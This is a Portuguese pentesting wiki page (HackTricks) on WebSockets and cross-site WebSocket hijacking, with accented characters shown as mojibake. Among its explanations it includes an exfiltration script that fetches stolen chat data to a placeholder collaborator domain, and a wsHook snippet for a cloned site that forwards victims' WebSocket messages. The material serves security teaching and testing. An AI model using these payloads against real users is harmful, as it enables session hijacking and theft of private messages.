# Cross-site WebSocket hijacking (CSWSH)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## O que s√£o WebSockets

As conex√µes WebSocket s√£o iniciadas por meio do **HTTP** e geralmente s√£o **de longa dura√ß√£o**. As mensagens podem ser enviadas em **ambas as dire√ß√µes a qualquer momento** e n√£o s√£o transacionais por natureza. A conex√£o normalmente permanecer√° aberta e ociosa at√© que o cliente ou o servidor esteja pronto para enviar uma mensagem.\
Os WebSockets s√£o particularmente √∫teis em situa√ß√µes em que s√£o necess√°rias **mensagens de baixa lat√™ncia ou iniciadas pelo servidor**, como feeds em tempo real de dados financeiros.

## Como as conex√µes WebSocket s√£o estabelecidas?

(Aqui voc√™ encontrar√° um resumo, mas um **guia mais detalhado sobre como uma conex√£o de web socket** √© criada pode ser encontrado [**aqui**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc)).\
As conex√µes WebSocket s√£o normalmente criadas usando JavaScript do lado do cliente, como o seguinte:
```javascript
var ws = new WebSocket("wss://normal-website.com/chat");
```
O protocolo **`wss`** estabelece um WebSocket sobre uma conex√£o **TLS** criptografada, enquanto o protocolo **`ws`** usa uma conex√£o **n√£o criptografada**.

Para estabelecer a conex√£o, o navegador e o servidor realizam um handshake WebSocket sobre HTTP. O navegador emite uma solicita√ß√£o de handshake WebSocket como a seguinte:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Se o servidor aceita a conex√£o, ele retorna uma resposta de handshake do WebSocket como a seguinte:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
Neste ponto, a conex√£o de rede permanece aberta e pode ser usada para enviar mensagens WebSocket em ambas as dire√ß√µes.

**Nota**

V√°rias **caracter√≠sticas** das mensagens de **handshake** do WebSocket s√£o dignas de nota:

* Os cabe√ßalhos **`Connection`** e **`Upgrade`** na solicita√ß√£o e resposta **indicam** que este √© um **handshake WebSocket**.
* O cabe√ßalho de solicita√ß√£o **`Sec-WebSocket-Version`** especifica a **vers√£o do protocolo WebSocket** que o cliente deseja usar. Isso √© tipicamente `13`.
* O cabe√ßalho de solicita√ß√£o **`Sec-WebSocket-Key`** cont√©m um **valor aleat√≥rio** codificado em Base64, que deve ser gerado aleatoriamente em cada solicita√ß√£o de handshake.
* O cabe√ßalho de resposta **`Sec-WebSocket-Accept`** cont√©m um hash do valor enviado no cabe√ßalho de solicita√ß√£o `Sec-WebSocket-Key`, concatenado com uma string espec√≠fica definida na especifica√ß√£o do protocolo. Isso √© feito para evitar respostas enganosas resultantes de servidores mal configurados ou proxies de cache.

O cabe√ßalho **`Sec-WebSocket-Key`** cont√©m um **valor aleat√≥rio** para evitar erros de proxies de cache e **n√£o √© usado para fins de autentica√ß√£o ou manipula√ß√£o de sess√£o** (_N√£o √© um token CSRF_).

### Console Linux

Voc√™ pode usar o `websocat` para estabelecer uma conex√£o bruta com um websocket.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Ou para criar um servidor websocat:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
## Conex√µes websocket MitM

Se voc√™ descobrir que os clientes est√£o conectados a um **websocket HTTP** a partir da sua rede local atual, voc√™ pode tentar um [Ataque de Spoofing ARP](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) para realizar um ataque MitM entre o cliente e o servidor.\
Assim que o cliente tentar se conectar, voc√™ pode usar:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
## Enumera√ß√£o de WebSockets

Voc√™ pode usar a **ferramenta** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **para descobrir, identificar e procurar por** **vulnerabilidades** **conhecidas** em websockets automaticamente.

## Hijacking de WebSocket entre sites (CSWSH)

Tamb√©m conhecido como _hijacking de WebSocket entre origens cruzadas_.\
**√â um** [**Cross-Site Request Forgery (CSRF)**](csrf-cross-site-request-forgery.md) **em um handshake de WebSocket.**

Isso ocorre quando a solicita√ß√£o de **handshake de WebSocket** depende exclusivamente de **cookies HTTP** para o tratamento de sess√µes e **n√£o cont√©m nenhum token CSRF** ou outros valores imprevis√≠veis.\
Um atacante pode criar uma **p√°gina da web maliciosa** em seu pr√≥prio dom√≠nio que **estabelece uma conex√£o de WebSocket entre sites** com o aplicativo vulner√°vel. O aplicativo lidar√° com a conex√£o no **contexto da sess√£o do usu√°rio v√≠tima** com o aplicativo.

### Ataque Simples

Observe que ao **estabelecer** uma conex√£o **websocket**, o **cookie** √© **enviado** para o servidor. O **servidor** pode estar usando-o para **relacionar** cada **usu√°rio espec√≠fico** com sua **sess√£o de websocket com base no cookie enviado**.

Ent√£o, se, por **exemplo**, o **servidor websocket** **enviar de volta o hist√≥rico da conversa** de um usu√°rio se uma mensagem com "**READY**" for enviada, ent√£o um **simples XSS** estabelecendo a conex√£o (o **cookie** ser√° **enviado automaticamente** para autorizar o usu√°rio v√≠tima) **enviando** "**READY**" ser√° capaz de **recuperar** o hist√≥rico da **conversa**:
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
  websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
  //Exfiltrate the confidential information to attackers server
  fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie com um subdom√≠nio diferente

Neste post de blog [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/), o atacante conseguiu **executar Javascript arbitr√°rio em um subdom√≠nio** do dom√≠nio onde a comunica√ß√£o do websocket estava ocorrendo. Como era um **subdom√≠nio**, o **cookie** estava sendo **enviado**, e como o **Websocket n√£o verificava a Origem corretamente**, era poss√≠vel se comunicar com ele e **roubar tokens dele**.

### Roubo de dados do usu√°rio

Copie a aplica√ß√£o web que voc√™ deseja se passar (os arquivos .html, por exemplo) e dentro do script onde a comunica√ß√£o do websocket est√° ocorrendo, adicione este c√≥digo:
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
    var xhttp = new XMLHttpRequest();
    xhttp.open("GET", "client_msg?m="+data, true);
    xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
    var xhttp = new XMLHttpRequest();
    xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
    xhttp.send();
    return messageEvent;
}
```
Agora baixe o arquivo `wsHook.js` em [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) e **salve-o dentro da pasta com os arquivos web**.\
Expondo a aplica√ß√£o web e fazendo um usu√°rio se conectar a ela, voc√™ ser√° capaz de roubar as mensagens enviadas e recebidas via websocket:
```javascript
sudo python3 -m http.server 80
```
## Outras vulnerabilidades

Como os Web Sockets s√£o um mecanismo para **enviar dados para o lado do servidor e do cliente**, dependendo de como o servidor e o cliente manipulam as informa√ß√µes, **os Web Sockets podem ser usados para explorar v√°rias outras vulnerabilidades, como XSS, SQLi ou qualquer outra vulnerabilidade comum da web usando a entrada de um usu√°rio de um websocket.**

## **WebSocket Smuggling**

Essa vulnerabilidade pode permitir que voc√™ **bypass as restri√ß√µes dos proxies reversos** fazendo-os acreditar que uma **comunica√ß√£o websocket foi estabelecida** (mesmo que n√£o seja verdade). Isso pode permitir que um atacante **acesse endpoints ocultos**. Para mais informa√ß√µes, consulte a seguinte p√°gina:

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## Refer√™ncias

{% embed url="https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
